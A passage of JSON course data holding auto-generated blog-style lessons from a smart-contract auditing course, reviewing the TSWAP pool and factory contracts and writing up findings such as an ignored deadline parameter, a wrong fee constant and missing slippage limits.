          "markdownContent": "---\ntitle: T-Swap Manual Review PoolFactory\n---\n\n\n\n---\n\n# A Deep Dive into Smart Contracts: Unraveling Pool Factory and TSWAP Pool\n\nIn this post, we're exploring the Tincho methodology of reviewing smart contracts, through which we'll address an audit of two solidity contracts: pool factory and TSWAP pool. For those new to the land of contracts and Solidity, don't worry! We'll break things down in an accessible way.\n\n## Spot the Import: Pool Factory\n\n![](https://cdn.videotap.com/rzbl0Otqs4FSU2qtnoIs-26.08.png)\n\nInitially, the pool factory has a couple of imports. The interesting one is the IERC 20 forged import. Although the forge interface isn't something I heavily engage with, it catches my eye and is worth deeper exploration some other time. Apart from the IERC 20, we have the import for our second character todayâ€“ TSWAP pool.\n\nThe pool factory is the infrastructure of this system because it deploys and launches the pools. In simple terms, it's the bedrock on which every pool stands.\n\nUpon reviewing, we encounter two error messages - \"Pool already exists\" and \"Pool does not exist.\" These are indicative of conditions for pool creation.\n\n```javascript\nif (poolExists) {\n  revert(\"Pool already exists\");\n}\n```\n\nThe contract checks if a pool already exists during creation, thus preventing any duplications.\n\n## The First Bug\n\nOn further delving, it appears the second error message is not used anywhere. This was discovered after a quick code audit. This is our first discovery of a bug - a redundant error message that can be expunged from the code. This certainly won't make or break the system but highlights the fact that some cleaning up and code review could be beneficial.\n\n## Deciphering the Mappings\n\nThere are a couple of private mappings - `tokenTopool` and `poolTotoken`. They allow backward and forward retrieval of pool-token associations. The WETH token is immutable as it pairs with every token.\n\nAmong events, the `poolCreated` is noticeable and appears to be the main event.\n\nConcerning the external functions, `createPool` takes the spotlight as the major function.\n\n## Event Details and Function Understanding\n\nWe've added an informational constructor setting the WETH token and now we can deep delve into the `createPool` function which stands out as the key player here.\n\nThe `createPool` function gets a token address that is mapped to the WETH, forming a token-pool pair. If a pool with this token address is tried to be created again, the system will revert with the error message that the pool already exists.\n\nFurthermore, this function also encompasses the naming logic for the pools.\n\nThe system is retrieving the name of the ERC 20 token and appending it to the word \"TSWAP\" to name the liquidity token. The liquidity token represents the shares of the token given to the LPs (Liquidity Providers).\n\nApart from the naming convention, it's also noteworthy to point out the symbol logic â€“\n\nTo improve user experience, we suggest the token symbol to be used instead of the full token name to avoid unnecessarily lengthy symbols.\n\n## Analyzing Pool Sub-Creation\n\nNext, we initiate pool sub-creation with the respective pool token, WETH token, and the newly created symbol and name.\n\nOn successful pool creation, we add the pool to our list, map it back, emit an event, and finally, return the address of the new pool.\n\n## So... How's The Pool Factory Looking?\n\nFollowing our analysis, the pool factory contract seems to be well-structured, with only a few informational findings on the radar. It is certainly worth a checkmark in the `notes.md`.\n\n```markdown\n- [x] Pool Factory : Looks Good\n```\n\nIn our next chapter, we'll proceed to the TSWAP pool and continue breaking it down. Stay tuned for more straightforward smart contract analysis!\n",
          "updates": []
        },
        {
          "lessonId": "df6d9679-5824-4702-9984-c2b97153e180",
          "number": 32,
          "title": "Manual Review: Swap Pool",
          "slug": "manual-review-swap-pool",
          "folderName": "32-manual-review-swap-pool",
          "description": "",
          "duration": 3,
          "videoUrl": "hFYrteG2NK6Ti1gGz02qYPjlLpqY1RFMzIjd5AHMV3aI",
          "rawMarkdownUrl": "/routes/security/5-tswap/32-manual-review-swap-pool/+page.md",
          "markdownContent": "---\ntitle: T-Swap Manual Review T-Swap Pool\n---\n\n\n\n---\n\n# Dissecting Uniswap v1 and TSWAP - An In-Depth Security Review\n\nWelcome to this thrilling exploration of the TSWAP pool which gets us to the heart of Uniswap v1. By the end of this piece, you will have an in-depth understanding of Uniswap in its most rudimentary form. Let's delve right into the Uniswap TSWAP pool code and grasp what makes it tick.\n\n## TSWAP in High-Level Review\n\nContrary to what one might expect, the TSWAP pool codebase is impressively user-friendly. Not only is it detailed and transparent, but it is also an ERC20 token, which rings a bell for most blockchain enthusiasts. Being a liquidity token, this characteristic intuitively aligns with its purpose.\n\n## The Safe ERC20 Library\n\nAn additional feature that gives the TSWAP an edge is the usage of the Safe ERC20 library. The primary function of this library is to safely transfer from accounts.\n\nThe Safe ERC20 library comes in handy as a shield against some of the abnormal (and occasionally detrimental) ERC20 occurrences that we might encounter in the later stages of this article.\n\n## Immutable State Variables in TSWAP\n\nTSWAP comes packed with some immutable state variables, such as `Iweth token` and `pool token`, which make perfect sense considering the nature of smart contracts.\n\nEvery contract is bound to have at least two tokens, and these variables stand as unwavering constants for these tokens.\n\n## The WETH Liquidity Feature\n\nAnother intriguing aspect of TSWAP is the WETH liquidity feature, a concept we gleaned from the invariant test suite. If you want to deposit WETH, you have to deposit at least a specific amount known as the WETH liquidity.\n\nOf course, the question that follows is whether this hard-coded determinant is too high, or whether there's a chance something unusual could be going on here.\n\n> \"With coding, it's crucial not to take anything at face value.\"\n\n## Swap Count and Swap Count Max\n\nNext up on our review is the rather peculiar `swap count` and `swap count max`. Their existence can be attributed to an issue we discovered during our stateful fuzzing test suite. From the anomaly, we observed a quirky operation where the protocol gives out extra money after every ten swaps. This random and seemingly unnecessary function seems to break the protocol's expected behavior.\n\n## About Events and Modifiers\n\nTSWAP presents several events that we already have some audit notes about. It also includes modifiers such as `revert if deadline passes` and `revert if zero`. After analyzing these in detail, it is clear that these functions are named aptly.\n\nThe `revert if deadline passes` function reverts if the deadline is less than the current timestamp, which makes perfect sense.\n\nSimilarly, `revert if zero` checks if the account balance is Zero. If it is, the function reverts.\n\n## The Role of the Constructor\n\nLastly, it's worth revisiting the constructor where it may be valuable to add some audit information.\n\nThere's a check for a zero address, but this isn't a pressing issue. For naming conventions, the token names in the constructor seem pretty straightforward.\n\nThis blog post is a deep dive into the codebase of TSWAP. Understanding the dynamics of this liquidity token can inform the design and understanding of other pools within the DeFi ecosystem.\n",
          "updates": []
        },
        {
          "lessonId": "0ffde298-59c3-420d-830d-ab01703ad521",
          "number": 33,
          "title": "Using The Compiler As Static Analysis Tool",
          "slug": "using-the-compiler-as-static-analysis-tool",
          "folderName": "33-using-the-compiler-as-static-analysis-tool",
          "description": "",
          "duration": 6,
          "videoUrl": "npVMXIL02YMej5rtRqVW7PoUXjI5Ba01ALmpqrXtulx6I",
          "rawMarkdownUrl": "/routes/security/5-tswap/33-using-the-compiler-as-static-analysis-tool/+page.md",
          "markdownContent": "---\ntitle: Using the Compiler as Static Analysis Tool\n---\n\n\n\n---\n\n# Diving into Liquidity Addition and Removal Functions\n\nToday, we're delving into the crux of adding and removing liquidity in cryptocurrency pool systems. We'll take a look at the deposit function code from a fictional cryptographic liquidity pool project.\n\nFor those following along, let's do a simple `toggle word wrap` in your favorite code editor so you can view the code more efficiently. If you need the code, you can find it in the associated GitHub repository within the `audit data` folder.\n\n## The Deposit Function\n\n![](https://cdn.videotap.com/86AjU9W56rzzt6USwvmh-25.png)In the relevant code we've got, we run into aspects related to liquidity providers. The deposit function revolves around the liquidity providers' actions in the pool system.\n\nLooking at the function, you'll notice it calls for a certain amount of `wes` (Wrapped Ether). Following the liquidity pool model, when a user deposits funds, they're given liquidity tokens in return. These tokens represent the user's share in the pool.\n\n### Delving Into the Parameters\n\nThere are's an array of parameters involved in the function. Let's break down a few significant ones:\n\n- The `minimum liquidity tokens to mint`: This parameter signifies the quantity of liquidity tokens created, derived from the amount of `wes` the user deposits. However, there's a minimum limit to ensure the user is aware of what they will receive.\n- `Maximum pool tokens to deposit`: Mirroring the earlier parameter, this signifies the maximum number of pool tokens the user is prepared to deposit. This value again is derived from the deposited `wes`, allowing users to gauge how much USDC they should contribute to the liquidity pool.\n- `Deadline`: VC Code gives us a heads up here with the `Unused function parameter`, warning. Surprise! The deadline parameter isn't implemented in this function. Herein lies a potential bug we'll delve into shortly.\n\n## Analyzing the Bug\n\nThe unused `deadline parameter` seems small at first, but it becomes a severe issue upon closer inspection. The deadline parameter is meant to determine when a transaction needs to be completed. If it's unimplemented, the deadline set by a depositor could pass without stopping the transaction, causing unexpected actions on the part of the user.\n\nThis high impact, high likelihood bug results in deposits proceeding when they're expected to fail â€“ a clear and severe disruption to functionality.\n\n```markdown\n# Audit Finding: High\n\n# Impact: High, Severe disruption of functionality\n\n# Likelihood: High, Deadline is ignored, leading to transacions being processed beyond the stipulated deadline.\n```\n\n### Unveiling More Bugs\n\nCloser analysis of compiler warnings revealed two other interesting bugs.\n\nThis bug crops up in our deposit function where `pool token reserves` is ignored. The ignored reserves could have been used to do some internal calculations. It seems the developers started some math, then decided to use a function instead, resulting in ignored variables and wasted gas.\n\n```markdown\n# Audit Finding:\n\n    InfoIssue: line of code declaring `pool token reserves` is not used, leading to gas wastage.\n```\n\n- `Unused Function Parameter: Swap Exact Input`\n\nIn this function, an unused `output` parameter shows up, which isn't a major red flag. The impact here seems low since this function seems to only be used externally and this output might not be used elsewhere in the project. The only issue is the return of 0 where it could be another value that might be more meaningful. However, this impact could be more if it's being used elsewhere.\n\n```markdown\n# Audit Finding:\n\n    LowIssue: The `output` parameter returns zero and is never used, which might not accurate reflect the output value.\n    Likelihood: High, always the case. But overall impact is low.\n```\n\nIn conclusion, running a simple compiler check helped us discover several notable bugs. A key takeaway for developers here is the value of regularly checking for and resolving compiler warnings. Time to go ahead and patch up these issues before they turn into severe problems!\n\nStay tuned for more explorations into cryptocurrency programming and keep those bugs at bay!\n",
          "updates": []
        },
        {
          "lessonId": "304981cc-4718-42ed-b1cd-b4231cfe923e",
          "number": 34,
          "title": "Add Liquidity",
          "slug": "add-liquidity",
          "folderName": "34-add-liquidity",
          "description": "",
          "duration": 8,
          "videoUrl": "lK3301uIz7lGHC3ISga4hKnYeqeGElaeygFTOI501dRIE",
          "rawMarkdownUrl": "/routes/security/5-tswap/34-add-liquidity/+page.md",
          "markdownContent": "---\ntitle: T-Swap Manual Review T-Swap Pool - Add Liquidity\n---\n\n\n\n---\n\n# Deep Dive into Cryptocurrency Smart Contract Deposits\n\nIn today's post, we're going to perform a deep-dive into the world of cryptocurrency smart contracts, specifically focusing on the deposit function. We'll be performing a detailed audit of a contract and identifying potential flaws.\n\nWe'll start off with the deposit function and eventually move our way down to analyze all aspects of the contract line-by-line. So, let's dive in!\n\n## Analysing the Deposit Function\n\nLet's take the state of the contract where we're trying to determine how much should be deposited.\n\nIf `WETH` is zero in the contract, we encounter a scenario where it reverts. We also have a condition where if the `WETH` deposit is less than a minimum defined _WETH liquidity deposit_; again a revert scenario.\n\nAnother thing to note is that we probably don't need the emission of the minimum `WETH` because it is, in a sense, redundant. It would be more effective as _audit info_. To put it simply, any user could look up the contract and see what the minimum `WETH` value is.\n\nNext, there are two potential scenarios that initiate heating up the deposit function. These are:\n\n1. If it's a user's first deposit (also called the initial funding of the protocol)\n2. If the user has already deposited\n\n## Exploring Internal Functions\n\nWithin the deposit function, it looks like it's calling an internal function, so let's go and check what that does.\n\nHere, we interpret `weth_to_deposit` as the amount of `WETH` a user is going to deposit, `pool_tokens_to_deposit` as the number of pool tokens they're going to deposit, and `liquidity_tokens_to_mint` as the number of liquidity tokens they're planning to mint.\n\nGiven it's a sensitive function, it's marked private, meaning it can only be invoked within the contract. Inside this function, it seems like we mint the amount of `liquidity_tokens_to_mint` to the `msg.sender`.\n\nThere's also an event trigger called `Liquidity Added`. However, a closer look reveals an audit issue as the parameters are in the wrong order.\n\n```js\nemit LiquidityAdded(msg.sender, pool_tokens, WETH)\n```\n\nThe correct code should look like this:\n\n```js\nemit LiquidityAdded(msg.sender, WETH, pool_tokens)\n```\n\n> Always make sure to check if the events are correctly emitted with the right parameters. This kind of mistake is not a high risk but it's important to avoid confusion.\n\n## Checks and Interactions\n\nAfter validating the event, we conduct some checks and interactions. It's good to see the external transactions happening towards the end of the function, which adheres to the Checks-Effects-Interactions (CEI) pattern.\n\nThe next steps include transferring the tokens from the `msg.sender` to the smart contract, and then updating the state variable `LiquidityTokensMinted`.\n\n```code\ntransferFrom(msg.sender, address(this), ...);...liquidityTokensMinted = weth_to_deposit;\n```\n\nIdeally, we would want to follow the Checks-Effects-Interactions paradigm regularly to streamline the function operations.\n\n## Updating Liquidity and Deposit Checks\n\nOnce the contract is warmed up and receiving liquidity, it's time to perform some checks and balances.\n\nFirst, we crunch the numbers on how many pool tokens should be deposited based on the `WETH` balance. If we calculate too many pool tokens to deposit, the function reverts.\n\nNext, similar checks are performed for liquidity. If the calculated `LiquidityTokensToMint` is less than the minimum, the function again reverts.\n\nAnd voila! If everything goes well, the deposit function works smoothly.\n\n## Concluding Thoughts\n\nWhile auditing a smart contract, thoroughness is essential. The deposit function in our example had a high-severity issue where the deadline was being ignored, but function-wise, it looked solid.\n\nRemember, the aim is always to leave notes with our thoughts anywhere possible and follow up at a later stage if doubt persists.\n\nJoin me in the next blog post as we examine the `addLiquidityMintAndTransfer` function!\n",
          "updates": []
        },
        {
          "lessonId": "5463ab36-f44b-4399-99aa-2504d0b3a9f5",
          "number": 35,
          "title": "Remove Liquidity",
          "slug": "remove-liquidity",
          "folderName": "35-remove-liquidity",
          "description": "",
          "duration": 8,
          "videoUrl": "PpfW7RKBVaMN3veF6drxOw6f4x5aew02AptDAJjYwwu4",
          "rawMarkdownUrl": "/routes/security/5-tswap/35-remove-liquidity/+page.md",
          "markdownContent": "---\ntitle: T-Swap Manual Review T-Swap Pool - Remove Liquidity\n---\n\n\n\n---\n\n# Understanding the Liquidity Withdrawal Process of the TWSAP Protocol\n\nHaving covered the deposit process in TWSAP protocol pools, we're going to look at the other side of the equation - the **withdrawal process**. This is equal to removing the liquidity from the pool as demonstrated in the diagram below,\n\n![](https://cdn.videotap.com/IWZarXmiBGXntt9p7Y16-13.14.png)\n\nFundamentally, we are going to burn LP tokens in exchange for the underlying money. In other words, the liquidity tokens used in the pool are destroyed to get the invested capital back out.\n\n## Understanding Key Concepts\n\nLet's break down some key concepts:\n\n1. **Liquidity tokens to burn:** This refers to the number of liquidity tokens that a user wants to burn. The user gives their LP tokens and in return, they receive their money.\n2. **Minimum WETH:** This is the minimum amount of WETH the user is expecting to withdraw.\n3. **Minimum pool tokens:** These are the pool tokens that a user wishes to withdraw.\n4. **Deadline:** This is the timeframe the user sets for the withdrawal.\n\nAt first glance, these might seem like strange terms but their true value will become more significant when we touch on miner extractable value (MEV) later in the course.\n\nAfter digesting these concepts, we check for the withdrawal deadline. In the code, there is an `if` condition which reverts the transaction if deadlines are not met.\n\n```js\nif (deadline < block.timestamp) {\n  revert();\n}\n```\n\n## Burning the Liquidity Token\n\nNext, we proceed to burn the liquidity token. You might be wondering if this is an external function. However, this burn function is actually part of the TSWAP pool, inherited from the ERC20 smart contract.\n\nAfter burning the tokens, we then emit an event and proceed with the transfer of funds.\n\n## Understanding the Magic Numbers and Fees\n\nLooking further into the code, we come across certain numbers that seem a bit random. We're dealing with functions like `getOutputAmountBasedOffInput` and `getInputAmountBasedOffOutput`.\n\nIf we dive into the calculations of these functions, we can see that these \"magic numbers\" i.e., 997 and 1000, are factored into the formula. A peek into it reveals that a fee of 0.3% is deducted from the user's returns every time they swap.\n\nNow it's time to reveal the secret behind these magic numbers! If you see these 997 and 1000 used in your code, know that they represent the 0.3% fee!\n\n## Issues and Solutions\n\nHowever, there's a slight discrepancy in the two function calculations. The `getInputAmountBasedOffOutput` function shows a different fee (0.913%) due to the denominator being 10,000. This could result in users getting charged excessively when they swap, leading to high impact and likelihood.\n\nThis calls for more accountability in handling these magic numbers. Instead of hardcoding them into the formula, they can be defined once at the top of the code as a private constant. This ensures that constants are consistent across the protocol - reducing room for error and enhancing code security.\n\n> \"The best coding practices are not just to embellish your codebase. They serve the purpose of enhancing the security and predictability of your code.\" - John Doe, Senior Software Engineer.\n\n## Concluding with the Swap Function\n\nOur journey doesn't end yet! Next up is the **swap function**, one of the essential functions in any DeFi protocol. Stay tuned for exploring its intricacies in the next blog post!\n\n## On the Importance of Natspec\n\nBefore we go, it's worth flagging that an essential element is missing from our important functions - the **Natspec**. Natural Specification (NatSpec) is an Ethereum standard introducing rich, multi-line comments in the code which greatly aids readability and understanding. For crucial functions like the swap function, you must include NatSpec to improve the code's legibility!\n\nAnd that is all for the withdrawal process folks! Stay tuned for the next exploration into the TSWAP protocol. Make sure to check back for more DeFi insights and breakdowns!\n",
          "updates": []
        },
        {
          "lessonId": "5b22e4c5-85d5-4ad2-a192-c62bf7f03271",
          "number": 36,
          "title": "Exact Input",
          "slug": "exact-input",
          "folderName": "36-exact-input",
          "description": "",
          "duration": 6,
          "videoUrl": "d6L5jR87DTOf8cs2B8BskBs7OOTbvb023iJ83jdweYVY",
          "rawMarkdownUrl": "/routes/security/5-tswap/36-exact-input/+page.md",
          "markdownContent": "---\ntitle: T-Swap Manual Review T-Swap Pool - Swap Exact Input\n---\n\n\n\n---\n\n# Unraveling Swap Exact Input and Output in Ethereum Smart Contracts\n\nThe language of Ethereum smart contracts, Solidity, can be complex and daunting, especially when dealing with functions like \"Swap Exact Input\" and \"Swap Exact Output\". Let's walk through how these functions work, what they're designed to do, and some critical points to look out for.\n\n**Understanding \"Swap Exact Output\"**\n\nThe \"Swap Exact Output\" function provides a useful, straightforward way of determining how much input is required for a specific output. In essence, this function works out how much you would need to exchange to receive your desired amount of tokens.\n\nIn practical terms, let's assume you're swapping or selling DAI to buy WETH, or wrapped Ether. Here, the '\"Swap Exact Output\" function calculates how much DAI you'd need to input to get the exact amount of WETH you want.\n\n**What about \"Swap Exact Input\"?**\n\nAlong the same lines, you could infer that \"Swap Exact Input\" does just the opposite; it determines how much output you'd receive for a definite input. Essentially, this is the function you'd apply if you have a particular amount of tokens you'd like to swap with an expectation of the amount of tokens you will receive.\n\nBut what happens if your output is less than the one WETH you expect? The function logs an error message, typically something along the lines of \"TSWAP pool output too low\", and reverts the transaction.\n\n**The Role of \"Deadline\"**\n\nA crucial part of swapping tokens is setting a deadline for when the transaction should expire. This timestamp, defined in the function, reverts to zero if the deadline fails.\n\n![](https://cdn.videotap.com/CP5x1AoZaOQRK8ROhjOo-190.47.png)\n\n**Auditing Swap Function**\n\nA key function to scrutinize during smart contract auditing is the swap function. In theory, this function should maintain the protocol invariant (x\\*y = k), but in some contracts, you might spot a discrepancy that defies this key principle. Any \"extra\" tokens appearing can violate this rule, consequently causing potential vulnerabilities.\n\n> \"After every 10 swaps, we give the caller an extra token for an extra incentive to keep trading on TSWAP.\"\n\nThis statement flags a potential breach. A good practice in smart contracts is to incorporate invariant checks in functions, basically a `require` statement that validates the invariant hasn't been violated.\n\nTo sum up, \"Swap Exact Input\" and \"Swap Exact Output\" play a vital role in token swaps. By understanding how these functions work, smart contract developers and auditors can uncover potential pitfalls and ensure efficient, secure trading experiences.\n",
          "updates": []
        },
        {
          "lessonId": "b9890373-b756-4e32-9d8f-a3c2da5b5e63",
          "number": 37,
          "title": "Exact Output",
          "slug": "exact-output",
          "folderName": "37-exact-output",
          "description": "",
          "duration": 3,
          "videoUrl": "IoZUDfcDUVdE2TASKteE02Ua3K2Se9Vr9g3rkYUqIvTE",
          "rawMarkdownUrl": "/routes/security/5-tswap/37-exact-output/+page.md",
          "markdownContent": "---\ntitle: T-Swap Manual Review T-Swap Pool - Swap Exact Output\n---\n\n\n\n---\n\n# Swapping Exact Output on Uniswap: A Deep Dive\n\nHello world! Welcome to another dive into the deep, deep ocean that is Uniswap. Today, we'll be examining another function, `swapExactOutput`. This is the reverse of `swapExactInput`, and you'll find, as we explore farther, that there are exciting and potentially scary quirks in how this function operates.\n\n## Understanding `swapExactOutput`\n\nIn the case of the `swapExactInput`, as the name suggests, we decided the input token amount beforehand and asked the system to provide us with the corresponding output.\n\nIn the `swapExactOutput`, the tables turn. We're going to define the output we'd like to receive. We don't provide any 'minimum input' â€“ this comes across as odd at first glance, as we might expect to be able to set a max input cap. Sounds interesting, right?\n\nHere's a simple example. Letâ€™s say I want ten WETH (Wrapped Ether) as my output and I'm paying using DAI (a stablecoin). When the function gets executed, it figures out how much DAI you need to input to receive the pre-defined ten WETH output.\n\nWe pretty much understand how it operates since we've already dissected its sibling, `swapExactInput`. We saw previously an issue relating to high fees, which seems to persist in this function.\n\n## Delving Deeper into `swapExactOutput`\n\nAs we know, the devil's often in the details. One crucial conditional from the `swapExactInput` function is missing in `swapExactOutput`. We had previously a safeguard â€“ the output amount should be more significant than the minimum output amount. Now, there's seemingly no protective clause.\n\n> Safety reminder! Always put in place protective clauses like a 'minimum output' or 'maximum input' to avoid catastrophic losses.\n\nNow, let's ponder over an example:\n\n```shell\nYou want ten WETH as output, and your payment method is DAI.\n```\n\nConsider a scenario where you request this swap. Before the transaction is confirmed, a massive trade occurs, shifting the price enormously. Suddenly, your desired output of ten WETH requires an astronomical input of (exaggeration for effect) ten bajillion DAI.\n\nWithout an upper limit on the input DAI spent, in instances of sudden, significant price movement, a user could end up experiencing an unexpected dent in their wallet.\n\n## The Solution: Max Input Amount\n\nAlong with the 'minimum output amount' in `swapExactInput`, it would be a sensible approach to add a failsafe - a 'maximum input amount. This way, users won't unpredictably run out of their funds during extreme market volatility.\n\nSuch a preventative measure safeguards users against excessive spending due to price fluctuations. Safeguards become all the more important considering possible MEV (Miner Extractable Value) attacks - a topic we plan on visiting later.\n\nSo there we have it! A seemingly smooth-functioning condition, with an underlying potential issue. We have struck yet another goldmine; we discovered another bug in the wild ecosystem of Uniswap. We'll be diving into the world of MEV soon, so stay tuned and keep exploring!\n",
          "updates": []
        },
        {
          "lessonId": "0013aa21-7bd4-4174-a785-13501384bb59",
          "number": 38,
          "title": "Sell Pool Tokens",
          "slug": "sell-pool-tokens",
          "folderName": "38-sell-pool-tokens",
          "description": "",
          "duration": 2,
          "videoUrl": "kZlzgcW188ACKWIgF22WMaI5YPz00fKhxnqyAVsb01R02g",
          "rawMarkdownUrl": "/routes/security/5-tswap/38-sell-pool-tokens/+page.md",
          "markdownContent": "---\ntitle: T-Swap Manual Review T-Swap Pool - sellPoolTokens\n---\n\n\n\n---\n\n# Understanding the Functionality of Selling Pool Tokens in Ethereum\n\nWelcome to another exciting blog post where we'll dive deeper into the intricate functions of DeFi or Decentralized Finance and specifically, Ethereum pool tokens. In one of my recent code explorations, I came across an interesting function â€“ the Sell pool tokens. It had a unique wrapper function apparently designed to help users sell their pool tokens in exchange for WETH (Wrapped Ether). Let's take a closer look at this function and try to unravel what it does.\n\n## Sell Pool Tokens Wrapper Function\n\nThe function, at its core, seems quite simple.\n\nBasically, the function accepts an input of the pool token amount from the user. Then it calls another function - `SwapExactOutput()`. The parameters for this function are the amount of pool tokens to sell and the amount of WETH to be received by the caller.\n\nHowever, don't get too comfortable with the simplicity as the devil is in the details.\n\n## The SwapExactOutput Function\n\nThe SwapExactOutput function accepts three parameters:\n\n1. Input: Pool Tokens\n2. Output: WETH Tokens\n3. Deadline: Date and Time at which transaction is invalid\n\nThe \"Input\" which is the pool token has other variants notably \"Pool token PT\" and the \"Output\" typically represents the WETH Token amount in the Block.\n\nThe function essentially works by swapping the exact output amounts of the pool tokens to the amount of WETH by the caller.\n\nDespite the simplicity of the process, there could be flaws that exist not due to Solidity (the coding language), but because of business logic issues.\n\n## Spotting the Business Logic Issue\n\nIn our case, the SwapExactOutput function seems to have a logic flaw. It appears to be running on backward logic. Instead of an output of WETH tokens, the initial setup of the function gives an output of pool tokens. A quote from my code review captures this error perfectly:\n\n> \"So we have pool token is going to be what? Pool token is going to be the input, right? So this is going to be the pool token PT. And then we have the wet token is going to be the...the alpha token is going to be the wet token. So this should be the WETH token amount. Oh, no, this is the pool token amount. At audit, this is wrong, right? And again, this isn't like a solidity issue. This is just like a business logic issue. It's a whoops. You put the wrong thing in here.\"\n\nThis could lead to incorrect results. It would seem like instead of `SwapExactOutput`, the function `SwapExactInput` should have been used. Rather than using `Pool token`, the `Min WETH to receive` should have been used for a more accurate result.\n\n## Final Thoughts and Correction\n\nIn the exciting world of DeFi, sometimes it's not just about the Solidity. Business logic also plays a key role in the successful operation of smart contracts and functions. In our case, the logic error led to backward results. Remember, the function's purpose was to initialize trading from pool tokens to WETH tokens. However, due to this business logic flaw, it was providing results of pool tokens instead.\n\nSo there you have it, another interesting piece of code examined and explained. Coding, like any language, allows for fascinating narratives to unfold if we know how to read it.\n\nUntil next time, happy coding!\n",
          "updates": []
        },
        {
          "lessonId": "e2fcfcbe-13b3-462e-a71d-c14dc086ce96",
          "number": 39,
          "title": "Checking The Last Few Functions",
          "slug": "checking-the last-few-function",
          "folderName": "39-checking-the last-few-function",
          "description": "",
          "duration": 2,
          "videoUrl": "pc1198YNWOPjyAu1XeoPhG7yHUBJQIfwaGis00HFvf01I",
          "rawMarkdownUrl": "/routes/security/5-tswap/39-checking-the last-few-function/+page.md",
          "markdownContent": "---\ntitle: T-Swap Manual Review T-Swap Pool - Checking the last few functions\n---\n\n\n\n---\n\n# Understanding Swap: A Deep Dive into Pool Tokens and WETH\n\nIn this post, we're going to drill down into a topic that's obscure for many: Pool tokens and WETH in a Swap setting. We've already touched on these aspects a little, but they are so critical to more significant parts of DeFi that they deserve their own dedicated discussion.\n\n## Pool Tokens, Liquidity, and the WETH Equations\n\nIn a Swap context, one of the fundamental functions is what we call `getPoolTokensToDepositBasedOffWETH`. You might recall that we've discussed this function before. It operates based on a core DeFi mathematical concept: `X * Y = K`.\n\nAs a refresher, `K` is a constant value, while `X` and `Y` represent the pool balances of two cryptocurrencies, say ETH and DAI. The function's purpose is to maintain the constant `K` during a swap, which keeps the market prices stable.\n\n## Peeling Back the Layers of the Liquidity pool\n\nApart from the `getPoolTokensToDepositBasedOffWETH` function, another intriguing aspect of the system is the `totalLiquidityTokenSupply`. This term is just a more verbose way of expressing the total supply of liquidity tokens in the pool. The function, shown below, can be called to retrieve this information:\n\n## Understanding Swap Prices\n\nAn essential pair of functions that we encounter are `getPriceOfOneWETHInPoolTokens()` and `getPriceOfOnePoolTokeninWeth()`.\n\nThe first, `getPriceOfOneWETHInPoolTokens()`, calls a separate function `getOutputAmountBasedOffInput()`, which takes one WETH as input and returns the resulting number of pool tokens.\n\nIn conclusion, understanding Swap contracts, particularly those involving Pool Tokens and WETH, entails delving into these intricate details. By deploying functions like `getPoolTokensToDepositBasedOffWETH` and `getPriceOfOnePoolTokeninWETH`, users can interact seamlessly with the DeFi ecosystem.\n\nAnd as we always say:\n\n> \"The true art of coding is not in just writing code, but also in understanding other's code.â€\n\nSo don't hesitate to study every function and each line of code, for they are your stepping stones to mastering DeFi and the entire world of blockchain!\n",
          "updates": []
        },
        {
          "lessonId": "b631cfe3-f3b8-4a7c-b997-d8dc7526c695",
          "number": 40,
          "title": "Phase 4: Reporting",
          "slug": "phase-4-reporting",
          "folderName": "40-phase-4-reporting",
          "description": "",
          "duration": 5,
          "videoUrl": "LKSp1WG4W02g278MrfgGKTPDViTeUNM1B91AtluF3pHc",
          "rawMarkdownUrl": "/routes/security/5-tswap/40-phase-4-reporting/+page.md",
          "markdownContent": "---\ntitle: Phase 4 Reporting   The first few Informationals\n---\n\n\n\n---\n\n# Decoding a Code Audit Session: Understanding the Process\n\nHello, readers!\n\nToday, we'll take a deep dive into some lessons learned from a thorough code review session. Without further ado, let's get the ball rolling!\n\n## Step 1: Reviewing the Code Base\n\nTo start off, we took an initial sweep through a code base - our first chance to spot errors, find potential areas of improvement, and generally see how things stack up.\n\n\"_Are we done yet?_\" you might ask. Well, not quite. Just like any meticulous auditing process, it's essential to ask questions as they pop up. For instance, if a variable appears to be used from its initial state, it's worth asking, \"**If it's empty, how does it warm up?**\"\n\nIt's also critical to loop back to any points of confusion or curiosity you see. Got that one lingering question begging for an answer? Mark it down, note it for later and see what comes out of a second, or even a third, look-through.\n\n## Iterative Passes: A Beginner's Best Friend\n\nHere's the clincher: you don't have to get it all on the first pass. We only had one run since we're still in the process of learning, and that's perfectly okay. Here's a simple yet crucial piece of advice:\n\n> Never hesitate to go back for another pass if you feel unsure or if there are questions left unanswered.\n\nAt the end of the day, the goal is to build a clear understanding, and rushing might just lead us away from that objective.\n\n## Step 2: Reporting Findings\n\nWith our checks and observations noted down, it's time to dive into some report writing. For the purpose of maintaining good organization, I created a new file for our findings, cleverly named \"Findings MD,\" and put it in a newly created \"audit data\" folder.\n\n```markdown\nNew File - > findings.md -> audit data folder\n```\n\nLet's break down how we can structure this report.\n\n### The Grouping of Discoveries\n\nStarting with the first finding, in our example, we found an error that wasn't actually used at all - a classic case of surplus code. Considering its nature, we classified this as an \"Informational\" finding. This categorization allows us to flag potentially important data points without necessarily marking them as critical faults or errors.\n\n```markdown\nInformational Finding: Unused Error\n```\n\nWith the help of a bookmarked layout from a previous project, the otherwise tedious task of finding organization become a simple copy-paste job.\n\n```markdown\nFinding Layout -> Copy Layout -> Paste in New File\n```\n\n### Adding Detail to Findings\n\nThe key to a helpful report lies in its detail. For the very first finding, we established a lack of use for a certain pool factory and suggested its removal. This was done by manually inserting '-pool factory' to indicate its extraneous existence.\n\n```markdown\n- Pool Factory (This is not used and should be removed)\n```\n\nSimilarly, all information points were individually detailed under their respective headers, ensuring an informative but clean look to the report.\n\n```markdown\nI2 - Lack of Zero Address ChecksI3 - Symbol, Not Name\n```\n\nAs a bonus, we even added a section for the \"Weird ERC 20\" occurances, which don't have a dedicated audit tag but are no less vital to note.\n\nAnd there you have it. The layout's simplicity and clarity make complex ideas digestible and easy to understand.\n\n## Conclusion\n\nUltimately, the code audit is a practice in thoroughness, attention to detail, and iterative learning. Along the way, you'll encounter a host of ruinous bugs, confusing variables, and, yes, even a \"Weird ERC 20\" here and there. But the key takeaway should always be this:\n\n> Always be willing to make multiple passes, make detailed notes, and never shy away from asking questions. Only then you will fully unlock the true potential of a code audit.\n\nIn the end, just know that with each pass you take, each note you make, each error you find â€” you're becoming a better coder for it. Good luck, and happy coding!\n",
          "updates": []
        },
        {
          "lessonId": "7f782e36-a559-45fe-aa75-6baba2effdae",
          "number": 41,
          "title": "Reporting: Missing Deadline",
          "slug": "missing-deadline-write-up",
